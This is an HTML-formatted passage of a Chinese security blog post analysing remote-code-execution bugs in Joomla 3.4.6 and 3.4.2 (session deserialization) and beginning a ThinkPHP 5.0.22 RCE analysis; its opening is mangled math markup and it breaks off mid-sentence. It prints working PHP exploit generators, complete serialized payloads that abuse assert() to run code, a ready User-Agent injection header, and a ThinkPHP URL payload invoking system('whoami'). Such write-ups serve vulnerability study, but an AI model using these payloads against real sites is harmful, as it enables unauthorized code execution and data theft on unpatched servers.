xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>f</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mi>u</mi></msub><mi>r</mi><mi>l</mi><mo stretchy=\"false\">)</mo><mtext>两个参数都是可控的，于是只要满足</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;feed_url)两个参数都是可控的，于是只要满足</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">两</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">都</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">于</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">只</span><span class=\"mord cjk_fallback\">要</span><span class=\"mord cjk_fallback\">满</span><span class=\"mord cjk_fallback\">足</span></span></span></span> this-&gt;cache 为 True，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>r</mi><mi>a</mi><msub><mi>w</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><mtext>为</mtext><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>，</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;raw_data为True，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">，</span></span></span></span>parsed_feed_url [‘scheme’] 不为空就能够 RCE 了，并且 $parsed_feed_url [‘scheme’] 可以能够利用 || $a=‘http//’; 绕过 scheme 的解析</p>\n<p>不过这个 call_user_func 属于 init () 方法，并不属于魔术方法，所以需要结合前面 JDatabaseDriverMysqli 类下的 disconnect () 中的 call_user_func_array 方法实现对 init () 方法的回调。就相当于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$this-&gt;disconnectHandlers = array(&quot;test&quot;=&gt;array(new SimplePie(),&quot;init&quot;));</span><br></pre></td></tr></table></figure>\n<p>这样的话就相当于实例化了一个 SimplePie 类的对象，并且调用 SimplePie 类下的 init () 方法。</p>\n<p>这里还有一个问题，虽然实例化了一个 SimplePie 的类，但是 SimplePie 类不会自动加载。需要去引入加载类。</p>\n<p>/libraries/legacy/simplepie/factory.php</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031184225965-1491276190.png\" alt=\"img\"></p>\n<p>发现刚开始就导入了 SimplePie 类，并且 JSimplepieFactory 类属于 autoload，会自动加载，这样的话只需要引入这个类就可以成功加载 SimplePie。</p>\n<p>payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class JSimplepieFactory&#123;&#125;</span><br><span class=\"line\">class JDatabaseDriverMysql&#123;&#125;</span><br><span class=\"line\">class JDatabaseDriverMysqli</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    protected $abc;</span><br><span class=\"line\">    protected $connection;</span><br><span class=\"line\">    protected $disconnectHandlers;</span><br><span class=\"line\">    function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;abc = new JSimplepieFactory();</span><br><span class=\"line\">        $this-&gt;connection = 1;</span><br><span class=\"line\">        $this-&gt;disconnectHandlers = [</span><br><span class=\"line\">            [new SimplePie, &quot;init&quot;],</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class SimplePie</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    var $sanitize;</span><br><span class=\"line\">    var $cache_name_function;</span><br><span class=\"line\">    var $feed_url;</span><br><span class=\"line\">    function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><br><span class=\"line\">        $this-&gt;cache_name_function = &quot;assert&quot;;</span><br><span class=\"line\">        $this-&gt;sanitize = new JDatabaseDriverMysql();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = new JDatabaseDriverMysqli();</span><br><span class=\"line\">$ser = serialize($obj);</span><br><span class=\"line\">echo str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $ser);?&gt;</span><br></pre></td></tr></table></figure>\n<p>最后构造的账号密码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username：\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0</span><br><span class=\"line\">password：123&quot;;s:4:&quot;test&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:6:&quot;\\0\\0\\0abc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:13:&quot;\\0\\0\\0connection&quot;;i:1;s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:3:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>登录时需要登录两次，第一次将他序列化存储进 session 中，第二次将 session 中的值反序列化和我们的输入进行比对，在第二次 rce 产生</p>\n<blockquote>\n<p>最后总结一下：</p>\n<p>1.Joomla 中会把登录的用户名和密码序列化存储进入 session，并且放入数据库中。</p>\n<p>2. 由于 username 和 password 是 protected，因此会有 <code>*N*</code>  的修饰，但数据库中不能存储 <code>N*N</code> （N 为 ASCII 为 0 的字符），因此在序列化入 session 中会将 <code>N*N</code>  替换为 <code>\\0\\0\\0</code> ，在下次和我们输入的用户名密码判断时反序列化，将其变为合规的序列化字符串</p>\n<p>3. 漏洞的关键点在于从 <code>\\0\\0\\0</code>  变为 <code>N*N</code>  时字符变少了三个，我们可以利用变少的三个做变量逃逸，从而覆盖 password</p>\n<p>4. 因此我们的输入用户名时可以自己构造 <code>\\0</code> ，比如我们构造如下用户 <code>\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0</code> ，这样反序列化后多出了 27 个字符把后面的 password 全部吃掉了 <code>s:8:s:&quot;username&quot;;s:54:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</code> ，password 被吃掉后我们就可以构造我们自己的 password，里面的内容为恶意代码，我们接下来要干的事情就是把我们序列化过的恶意代码放入因为逃逸而变为可控变量的 password 中</p>\n<p>5. 然后我们需要找危险函数，来调用，我们在 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  中找到了 <code>disconnect()</code>  函数，其中调用了 <code>call_user_func_array</code> ，而 mysqli 类中的 <code>__destruct()</code>  会自动调用 <code>disconnect ()</code></p>\n<p>6. 但是 <code>disconnect()</code>  函数中的 <code>call_user_func_array</code>  中的参数我们只能控制第一个参数 <code>$h</code> ，不能直接构造恶意代码</p>\n<p>7. 我们在 <code>libraries\\simplepie\\simplepie.php</code>  中有一个 <code>init()</code>  函数，其中还可以找到一个危险函数 <code>call_user_func</code>  方法调用，并且好消息是他的两个参数 <code>cache_name_function</code>  和 <code>feed_url</code>  我们都可以控制</p>\n<p>8. 但是 <code>init()</code>  不是魔法方法，不会自动调用，我们需要使用一些奇技淫巧调用。即使用刚刚的 <code>disconnect()</code>  函数自动调用 <code>init()</code></p>\n<p>9. 接下来的问题就是我们如何用 <code>disconnect()</code>  中的一个可控参数完成对 <code>init()</code>  的调用。我们使用 <code>call_user_func_array(array(new SimplePie(),&quot;init&quot;))</code>  这样的形式来调用，array 中第一个是我们的类名，第二个是类函数名，而我们不需要 ``call_user_func_array ()` 中的第二个变量</p>\n<p>10. 最后一个问题是 <code>libraries\\simplepie\\simplepie.php</code>  和 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  是两个不同的 <code>php</code>  文件，如果没有 <code>include()</code>  这类函数的情况下是无法使用隔壁 php 的类的。我们的解决方案是找到一个新的文件 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code> ，同时 <code>factory.php</code>  中的 <code>JSimplepieFactory</code>  是自动 <code>autoload</code> ，这样我们就能加载 <code>simplepie</code>  类</p>\n<p>11. 由于 <code>session</code>  的存在，我们需要抓包，连续放包两次，第一次将 <code>session</code>  写入数据库中，第二次将我们的输入和数据库中反序列化的 <code>session</code>  比对，一旦反序列化，我们上面构造的恶意 <code>payload</code>  触发，实现 <code>rce</code></p>\n</blockquote>\n<h3 id=\"joomla-342截断反序列化\"><a class=\"markdownIt-Anchor\" href=\"#joomla-342截断反序列化\">#</a> Joomla 3.4.2 截断反序列化</h3>\n<p>这个漏洞和前一个 Joomla3.4.6 反序列化很像，利用了相同的危险函数 <code>libraries\\simplepie\\simplepie.php</code>  中的一个 <code>init()</code>  函数和 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  中的 <code>disconnect()</code>  函数，并且利用 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code>  自动加载</p>\n<p>区别在于：</p>\n<blockquote>\n<p>joomla 也没有采用 php 自带的 session 处理机制，而是用多种方式（包括 database、memcache 等）自己编写了存储 session 的容器（storage）。</p>\n<p>其存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。</p>\n<p>那么，我们这里就可以通过注入一个 <code>|</code>  符号，将它前面的部分全部认为是 name，而 | 后面我就可以插入任意 serialize 字符串，构造反序列化漏洞了。</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/thum-16e81451235948.jpg\" alt=\"14501748976406.jpg\"></p>\n<p>但还有一个问题，在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像 SQL 注入，还有注释符可用。</p>\n<p>但不知各位是否还记得当年 wordpress 出过的一个 XSS ( <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sZWF2ZXNvbmdzLmNvbS9IVE1ML3dvcmRwcmVzcy00LTEtc3RvcmVkLXhzcy5odG1s\">http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html</span> )，当时就是在插入数据库的时候利用 &quot;𝌆&quot;（% F0%9D%8C%86）字符将 utf-8 的字段截断了。</p>\n<p>这里我们用同样的方法，在 session 进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。</p>\n<p>在 php5.6.13 以前的版本里，php 在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。<br>\n用 unserialize 解析键值，解析结果作为 session。</p>\n<p>但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。</p>\n<p>所以，这个 joomla 漏洞的核心内容就是：我们通过𝌆字符， 将原本的 session 截断了，结果因为长度不对所以第一次解析 | 失败，才轮到第二次解析我传入的 |，最后成功利用。</p>\n<p>所以，构造 session 出错，是这个漏洞成立的核心。</p>\n<p>我们可以用长字符（64k）串截断，来达成类似和𝌆字符截断一样的效果。</p>\n<p>我们最终的 exp 为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//header(&quot;Content-Type: text/plain&quot;);</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JSimplepieFactory</span> </span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JDatabaseDriverMysql</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SimplePie</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$sanitize</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$cache</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$cache_name_function</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$javascript</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> <span class=\"variable\">$feed_url</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;feed_url = <span class=\"string\">&quot;phpinfo();JFactory::getConfig();exit;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;javascript = <span class=\"number\">9999</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cache_name_function = <span class=\"string\">&quot;assert&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;sanitize = <span class=\"keyword\">new</span> <span class=\"title class_\">JDatabaseDriverMysql</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;cache = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">JDatabaseDriverMysqli</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$disconnectHandlers</span>;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$connection</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a = <span class=\"keyword\">new</span> <span class=\"title class_\">JSimplepieFactory</span>();</span><br><span class=\"line\">        <span class=\"variable\">$x</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SimplePie</span>();</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;connection = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;disconnectHandlers = [</span><br><span class=\"line\">            [<span class=\"variable\">$x</span>, <span class=\"string\">&quot;init&quot;</span>],</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">JDatabaseDriverMysqli</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>); </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://www.leavesongs.com/content/uploadfile/201512/thum-46141451235941.jpg\" alt=\"14501734764205.jpg\"></p>\n<p>将这个代码生成的 exp，以前面提到的注入『|』的变换方式，带入前面提到的 user-agent 中，即可触发代码执行。</p>\n<p>其中，我们需要将 <code>char(0)*char(0)</code>  替换成 \\0\\0\\0，因为在序列化的时候，protected 类型变量会被转换成 <code>\\0*\\0name</code>  的样式，这个替换在源代码中也可以看到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$result = str_replace(&#x27;\\0\\0\\0&#x27;, chr(0) . &#x27;*&#x27; . chr(0), $result); </span><br></pre></td></tr></table></figure>\n<p>给出我最终构造的 POC（既是上述 php 代码生成的 POC）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\\0\\0\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\\0\\0\\0connection&quot;;i:1;&#125;ð</span><br><span class=\"line\"></span><br><span class=\"line\">//简单分析一下，123&#125;是为了将前一个解析失败的键值对闭合,__是他的命名规范,后面使我们的恶意代码</span><br></pre></td></tr></table></figure>\n<p>我们再再再总结一下:</p>\n<blockquote>\n<p>1. 由于 Joomla 自定义 session 存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。而 php 5.6.13 以前在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。用 unserialize 解析键值，解析结果作为 session。但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。</p>\n<p>2. 我们利用（1）可以构造出我们自己的恶意代码的 payload，但是为什么要放在 User-agent 中捏？看图</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115162408024.png\" alt=\"image-20221115162408024\" style=\"zoom: 50%;\" />\n<p>因为 libraries/joomla/session/session.php 中，_validate 函数，将 ua 和 xff 调用 set 方法设置到了 session 中（session.client.browser 和 session.client.forwarded），并且这两个参数使我们可控的</p>\n<p>3. 为什么 exp 要按照上面的写捏，因为他除了截断和利用方式有所不同之外，触发函数都是相同滴</p>\n<p>4. 那么有人又要问，那么后面多出来的 session 咋办捏，他原来 session 后面还有 cookie 等字段。但我们使用四字节截断了，后面的东西都没啦，就是上面的那坨 ð</p>\n<p>5. 利用时我们仍需要进行两次发包，第一次不携带 cookie 和 User-agent，作用是将 cookie 存储进入数据库。第二次的 cookie 为第一个返回包中的 cookie，User-agent 为我们构造的恶意 payload，第二次发包时从数据库读取 session，造成 rce</p>\n</blockquote>\n<h3 id=\"thinkphp-5022-rce\"><a class=\"markdownIt-Anchor\" href=\"#thinkphp-5022-rce\">#</a> Thinkphp 5.0.22 RCE</h3>\n<p>这里将 Thinkphp5.0.22 解包之后可以看到如下目录结构：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235402918-1496995877.png\" alt=\"img\"></p>\n<p>根据类的命名空间可以快速定位文件位置，在 ThinkPHP5.0 的规范里面，命名空间其实对应了文件的所在目录，app 命名空间通常代表了文件的起始目录为 application，而 think 命名空间则代表了文件的其实目录为 thinkphp/library/think，后面的命名空间则表示从起始目录开始的子目录，如下图所示：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235944649-946485747.png\" alt=\"img\"></p>\n<p>Thinkphp 执行过程：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120151418540.png\" alt=\"image-20221120151418540\" style=\"zoom:67%;\" />\n<p>在具体分析流程前传参方式，首先介绍一下模块等参数</p>\n<ul>\n<li>模块 : application\\index，这个 index 就是一个模块，负责前台相关</li>\n<li>控制器：在模块中的文件夹 controller，即为控制器，负责业务逻辑</li>\n<li>操作：在控制器中定义的方法，比如在默认文件夹中 application\\index\\controller\\Index.php 中就有两个方法，index 和 hello</li>\n<li>参数：就是定义的操作需要传的参数</li>\n</ul>\n<p>在本文中会用到两种传参方式，其他的方式可以自行了解</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. PATH_INFO模式 : http://127.0.0.1/public/index.php/模块/控制器/操作/(参数名)/(参数值)...</span><br><span class=\"line\">2. 兼容模式 : http://127.0.0.1/public/index.php?s=/模块/控制器/操作&amp;(参数名)=(参数值)...</span><br></pre></td></tr></table></figure>\n<p>如果直接访问入口文件 index.php 的话，由于 URL 中没有模块、控制器和操作，因此系统会访问默认模块（index）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/index.php</span><br><span class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/index/index</span><br></pre></td></tr></table></figure>\n<p>在 application\\index\\controller 目录下新建一个 Test.php，我们访问下面链接即可访问到 Test 控制器下的 hello 方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/test/hello/name/bmjoker</span><br></pre></td></tr></table></figure>\n<p><strong>漏洞分析</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：</span><br><span class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>\n<p>程序入口 public/index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// [ 应用入口文件 ]</span><br><span class=\"line\">// 定义应用目录</span><br><span class=\"line\">define(&#x27;APP_PATH&#x27;, __DIR__ . &#x27;/../application/&#x27;);</span><br><span class=\"line\">// 加载框架引导文件</span><br><span class=\"line\">require __DIR__ . &#x27;/../thinkphp/start.php&#x27;;</span><br></pre></td></tr></table></figure>\n<p>public/start.php 会去调用 App 类的 run 方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace think;</span><br><span class=\"line\">// ThinkPHP 引导文件</span><br><span class=\"line\">// 1. 加载基础文件</span><br><span class=\"line\">require __DIR__ . &#x27;/base.php&#x27;;</span><br><span class=\"line\">// 2. 执行应用</span><br><span class=\"line\">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>\n<p>run () 有两个比较重要的方法：routeCheck () 方法和 exec () 方法</p>\n<p>由于未设置调度信息，所以 $dispatch 为 null，进入 if 循环调用 routeCheck () 方法进行 URL 